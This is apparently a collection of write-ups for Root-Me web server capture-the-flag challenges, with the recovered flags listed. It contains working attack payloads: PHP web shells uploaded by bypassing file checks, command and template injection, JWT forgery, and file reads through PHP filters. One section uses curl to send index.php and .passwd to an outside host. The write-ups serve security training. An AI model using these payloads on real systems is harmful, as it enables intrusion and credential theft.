## Web Server root-me

### HTML - Source code

F12:

```
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
```

### HTTP - IP restriction bypass

Add Header `X-Forwarded-For: 127.0.0.1`, `X-Forwarded-For: 192.168.1.1`, ...

```
Well done, the validation password is: Ip_$po0Fing
```

### HTTP - Open redirect

Open Facebook: http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134

Open Twitter: http://challenge01.root-me.org/web-serveur/ch52/?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0

Decode md5: a023cfbf5f1c39bdf8407f28b60cd134 -> https://facebook.com, be8b09f7f1f66235a9c91986952483f0 -> https://twitter.com

-> Redirect to: http://challenge01.root-me.org/web-serveur/ch52/?url=https://www.youtube.com&h=d245406cb6c9f36be9064c92c34e12e1

```
Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
```

### HTTP - User-agent

Change Header `User-Agent: admin`

```
Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
```

### Weak password

Payload username=admin&password=admin  -> password is `admin`

### PHP - Command injection

Payload `127.0.0.1;cat .passwd` -> S3rv1ceP1n9Sup3rS3cure

### Backup file

`curl http://challenge01.root-me.org/web-serveur/ch11/index.php~`

```
$username="ch11";
$password="OCCY9AcNm1tj";
...
```

### HTTP - Directory indexing

F12 -> we can see: `<!-- include("admin/pass.html") -->` in source code.

Access admin/pass.html -> back to admin -> access backup/admin.txt -> Password / Mot de passe : LINUX

### HTTP - Headers

We can see in Response Header `Header-RootMe-Admin: none` -> Change to `Header-RootMe-Admin: true`.

```
You dit it ! You can validate the challenge with the password HeadersMayBeUseful
```

### HTTP - POST

POST -> Change score in Request Body to 1000000 -> Re-POST

```
Flag to validate the challenge: H7tp_h4s_N0_s3Cr37S_F0r_y0U 
```

### HTTP - Improper redirect

The application redirect from index.php to login.php if you don't login.

Let's try: `curl challenge01.root-me.org/web-serveur/ch32/index.php`

```
The flag is : ExecutionAfterRedirectIsBad
```

### HTTP - Verb tampering

Try change method:

`curl -X POST challenge01.root-me.org/web-serveur/ch8/`

`curl -X PUT challenge01.root-me.org/web-serveur/ch8/`

```
<h1>Mot de passe / password : a23e$dme96d3saez$$prap
```

### Install files

F12 -> we can see `<!--  /web-serveur/ch6/phpbb -->` in source code.

Try access `http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php`:

```
Le mot de passe pour valider est : karambar
```

### CRLF

We can use the payload: `?username=admin authenticated.%0D%0Afoo&password=authenticated`

And get the response:

```
admin authenticated.
foo failed to authenticate.

Well done, you can validate challenge with this password : rFSP&G0p&5uAg1% 
```

### File upload - Double extensions

Create file `a.php.png` with following content and upload:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?> 
```

Access to the file uploaded and add params on url `?cmd=ls`

```
a.php.png test.php.jpg test.php.png test.php.png 
```

Now we can use path traversal, let's try: `?cmd=ls ../../../ -a`

```
. .. ._init ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php-fpm.pool.inc .git .gitignore .passwd galerie index.php tmp tmp 
```

Finally, get password: `?cmd=cat ../../../.passwd`

```
Gg9LRz-hWSxqqUKd77-_q-6G8
```

### File upload - MIME type

Create `test.php` file with the following content:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?> 
```

Upload file with intercept, change header `Content-Type: image/png` -> Upload successfully!

Access file `galerie/upload/274661e11adfa6605d5aaa8b7f8a6485//test.php`, add parameter `?cmd=ls%20../../../%20-a`:

```
. .. ._init ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php-fpm.pool.inc .git .gitignore .passwd galerie index.php tmp tmp
```

Change parameter to `?cmd=cat%20../../../.passwd`:

```
a7n4nizpgQgnPERy89uanf6T4
```

### HTTP - Cookies

Change `Cookie: ch7=admin, ...` -> Validation password : ml-SYMPA

### Insecure Code Management

Download `.git` folder using: `wget --no-parent -r http://challenge01.root-me.org/web-serveur/ch61/.git/`

Access .git folder and tracking: `git log`

```
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date:   Mon Sep 23 15:10:07 2019 +0200

    renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date:   Sun Sep 22 12:38:32 2019 +0200

    changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date:   Thu Sep 12 11:10:06 2019 +0200

    secure auth with md5
```

Checkout commit: `git checkout a8673b295eca6a4fa820706d5f809f1a8b49fcba`

Now we can use `ls` to show all file:

```
$ ls
config.php  index.php
```

Read config file: `cat config.php`:

```
<?php
    $username = "admin";
    $password = "s3cureP@ssw0rd";
```

### JSON Web Token (JWT) - Introduction

Login as Guest!, we can get the cookie in response:

`jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`

We can decode it:

`echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d` -> {"typ":"JWT","alg":"HS256"}

`echo -n eyJ1c2VybmFtZSI6Imd1ZXN0In0 | base64 -d` -> {"username":"guest"}

`OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk` is secret base HS256, we don't know it.

But we can generate jwt for admin by change the algorithm signing to "none", look like that:

`echo -n '{"typ":"JWT","alg":"none"}' | base64` -> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

`echo -n '{"username":"admin"}' | base64` -> eyJ1c2VybmFtZSI6ImFkbWluIn0=

And keeping the secret: OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk

This is the jwt for admin: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk`

POST cookie in the request:

`curl http://challenge01.root-me.org/web-serveur/ch58/index.php --cookie jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk `

```
Welcome admin to this website! :)<br><br>You can validate the challenge with the flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```

### Directory traversal

This application include local file, first we try set page include root folder (`?galerie=/`):

We can see `86hwnX2r` folder in /. Next: `?galerie=86hwnX2r`

Oh, we can see the `password.txt` in folder `86hwnX2r`. OK, open file: `http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt` -> kcb$!Bx@v4Gs9Ez

### File upload - Null byte

Create file `test.php%00.png` with the following content:

```php
<?php
$data = system($_GET["cmd"]);
echo $data;
?>
```

After upload file, we can access file to get password: http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/4acfbde85e2f34215c875b0eb2ebe90d/test.php

```
Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF
This file is already deleted.
```

### JSON Web Token (JWT) - Weak secret

Access to /token, we get the token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw`

Try decode it:

`echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9 | base64 -d` -> {"typ":"JWT","alg":"HS512"}

`echo -n eyJyb2xlIjoiZ3Vlc3QifQ | base64 -d` -> {"role":"guest"}

We need brute-force to find secret: 4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw

In this challenge, I will use https://github.com/brendan-rius/c-jwt-cracker to brute-force secret:

`./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw qwertyuiopasdfghjklzxvbnm1234567890 6 sha512`

where `qwertyuiopasdfghjklzxvbnm1234567890` is valid character, `6` is maximum length of secret.

```
Secret is "lol"
```

Now we can generate jwt for admin with payload data is `{"role":"admin"}`: This is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA`

POST to /admin, we get:

```
"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```

Change Header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA` and Re-POST:

```
"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime\n"
```

### JWT - Revoked token

This is source code:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

First, POST request to /login with parameter: `{"username": "admin", "password": "admin"}` with `Content-Type: application/json`, we get the jwt token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

Go to /admin, add header `Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

```
{"msg":"Bad Authorization header. Expected value 'Bearer <JWT>'"}
```

Change header `Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0`

```
{"msg":"Token is revoked"}
```

Because the token was saved in blacklist, but based base64 decode we have the `=` is padding. Let's change the header (by adding `=` in the last of token):

`Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDgyMjU4NjEsIm5iZiI6MTY0ODIyNTg2MSwianRpIjoiYjI3ZjYxZTctZmY4Mi00YTgwLWEzODktYjZlZTdhYjE0NThmIiwiZXhwIjoxNjQ4MjI2MDQxLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.i7tCb7lTEfk88Rz6G0lBsG5k0hOKuHUF4uKSNqYVZ_0=`

```
{"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
```

### PHP - assert()

This application include local file, when i change `?page=../` it raise error:

```
Warning: assert(): Assertion "strpos('includes/../.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!
```

To fill valid strpos() function and get the .password, we can use the payload:

`?page=about.php%27,%27.%27)===false%20or%20system(%27cat%20.passwd%27);//`

```
The flag is / Le flag est : x4Ss3rT1nglSn0ts4f3A7A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/about.php','.')===false or system('cat .passwd');//.php'File does not exist
```

### PHP - Filters

This application include local file, we can use PHP Wrapper to bypass: `?inc=php://filter/read=convert.base64-encode/resource=index.php`

```
home
login
PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==
```

Base64 decode:

```
echo -n PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg== | base64 -d
<?php include("ch12.php");?>
```

Next we get the content of ch12.php: `?inc=php://filter/read=convert.base64-encode/resource=ch12.php`

```
PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E
```

Base64 decode:

```
<?php

$inc="accueil.php";
if (isset($_GET["inc"])) {
    $inc=$_GET['inc'];
    if (file_exists($inc)){
        $f=basename(realpath($inc));
        if ($f == "index.php" || $f == "ch12.php"){
            $inc="accueil.php";
        }
    }
}

include("config.php");


echo '
  <html>
  <body>
    <h1>FileManager v 0.01</h1>
    <ul>
        <li><a href="?inc=accueil.php">home</a></li>
        <li><a href="?inc=login.php">login</a></li>
    </ul>
';
include($inc);

echo '
  </body>
  </html>
';


?>
```

Next we get the content of config.php: `?inc=php://filter/read=convert.base64-encode/resource=config.php`

```
PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
```

Base64 decode:

```
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

### PHP - register globals

It seems that the developper often leaves backup files around...

We can download the file `index.php.bak` file with the following content:

```php
<?php


function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}



function display($res){
    $aff= '
          <html>
          <head>
          </head>
          <body>
            <h1>Authentication v 0.05</h1>
            <form action="" method="POST">
              Password&nbsp;<br/>
              <input type="password" name="password" /><br/><br/>
              <br/><br/>
              <input type="submit" value="connect" /><br/><br/>
            </form>
            <h3>'.htmlentities($res).'</h3>
          </body>
          </html>';
    return $aff;
}



session_start();
if ( ! isset($_SESSION["logged"]) )
    $_SESSION["logged"]=0;

$aff="";
include("config.inc.php");

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}

echo $aff;

?>
```

We need to set `$_SESSION["logged"]==1`, let's add parameter `?_SESSION[logged]=1` into URL:

```
well done, you can validate with the password : NoTQYipcRKkgrqG
```

### Python - Server-side Template Injection Introduction

This service allows you to generate a web page. Use it to read the flag!

When we try submit `title=123&content=%7B%7B3**3%7D%7D&button=`, the response is:

```
{"content":"27","title":"123"}
```

We can see 3**3 = 27 -> Now we will inject to content field.

You can find some payload is here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

With payload: `content={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls -a").read()}}`

```
{"content":".\n..\n._firewall\n.git\n._nginx.server-level.inc\n.passwd\n._perms\nrequirements.txt\n._run\nserver_ch74.py\nstatic\ntemplates\n","title":"123"}
```

Read password: `content={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat .passwd").read()}}`

```
{"content":"Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n","title":"123"}
```

### File upload - ZIP

Your goal is to read index.php file.

When I upload .zip file contain test.php, the application auto unzip and show all file in: /tmp/upload/623e84e1156845.25011439/

```
http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/623e84e1156845.25011439/

8caba7d65b81501f3b65eca199c28ace.zip	194 B	2022-Mar-26 04:13
test.php
```

But when I access test.php, the application return 403 Forbidden. Because we don't have access permission in /tmp/upload.

Hmm, we will create symbolic link from test.php to index.php file, because we can access to index.php page.

```
ln -s ../../../index.php ./test.php
zip --symlinks -r test.zip ./test.php
```

Upload .zip file and open test.php, it doesn't working!, may be the application prevent .php file extension.

Let's change the extension to .txt.

```
ln -s ../../../index.php ./a.txt
zip --symlinks -r a.zip ./a.zip
```

Upload .zip file and open a.txt:

```
<?php
if(isset($_FILES['zipfile'])){
    if($_FILES['zipfile']['type']==="application/zip" || $_FILES['zipfile']['type']==="application/x-zip-compressed" || $_FILES['zipfile']['type']==="application/octet-stream"){
        $uploaddir = 'tmp/upload/'.uniqid("", true).'/';
        mkdir($uploaddir, 0750, true);
        $uploadfile = $uploaddir . md5(basename($_FILES['zipfile']['name'])).'.zip';
        if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $uploadfile)) {
            $message = "<p>File uploaded</p> ";
        }
        else{
            $message = "<p>Error!</p>";
        }
	
        $zip = new ZipArchive;
        if ($zip->open($uploadfile)) {
            // Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
            exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'", $output, $ret);
            $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
	    $zip->close();
        }
	else{
		$message = "<p> Decompression Error </p>";
	}
    }
    else{
		
	$message = "<p> Error bad file type ! <p>";
    }

}
?>
```

The flag is: N3v3r_7rU5T_u5Er_1npU7

### Command injection - Filter bypass

Find a vulnerability in this service and exploit it. Some protections were added. The flag is on the index.php file.

After testing, we can exploit by payload `ip=127.0.0.1%0A<another cmd>`

I tried to use `ip=127.0.0.1%0Als`, the response is only `Ping OK` and don't show the tree directory, same as `ip=127.0.0.1%0Acat index.php`, ...

Let's creat mock api server by beeceptor, https://hoang-rootme.free.beeceptor.com and use payload:

`ip=127.0.0.1%0Acurl https://hoang-rootme.free.beeceptor.com`

In mock api https://hoang-rootme.free.beeceptor.com, we can see GET response.

Now, we will use curl to POST file from the application to mock api with payload:

`ip=127.0.0.1%0Acurl -X POST https://hoang-rootme.free.beeceptor.com -d @index.php`

In mock api we can see the response:

```
Hey ya! Great to see you here. Btw, nothing is configured for this request path. Create a rule and start building a mock API.

<html><head><title>Ping Service</title></head><body><form method="POST" action="index.php">        <input type="text" name="ip" placeholder="127.0.0.1">        <input type="submit"></form><pre><?php $flag = "".file_get_contents(".passwd")."";if(isset($_POST["ip"]) && !empty($_POST["ip"])){        $ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);	//$ip = @str_replace(['\\', '$', '|', '`', ';', '&', '<', '>'], "", $_POST["ip"]);        $response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");        $receive = @preg_match("/3 packets transmitted, (.*) received/s",$response,$out);        if ($out[1]=="3")         {                echo "Ping OK";        }        elseif ($out[1]=="0")        {                echo "Ping NOK";        }        else        {                echo "Syntax Error";        }}?></pre></body></html>
```

Finally,  get the password:

`ip=127.0.0.1%0Acurl -X POST https://hoang-rootme.free.beeceptor.com -d @.passwd`

```
Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!
```

### Java - Server-side Template Injection

With basic payload `${7*7}`, we can see the response:

```
It's seems that I know you :) 49
```

Now we can get the flag by payload: `${"freemarker.template.utility.Execute"?new()("cat SECRET_FLAG.txt")}`

```
B3wareOfT3mplat3Inj3ction
```

### JSON Web Token (JWT) - Public key

You find an API with 3 endpoints:
/key (accessible with GET)
/auth (accessible with POST)
/admin (accessible with POST)
There is sure to be important data in the admin section, access it!

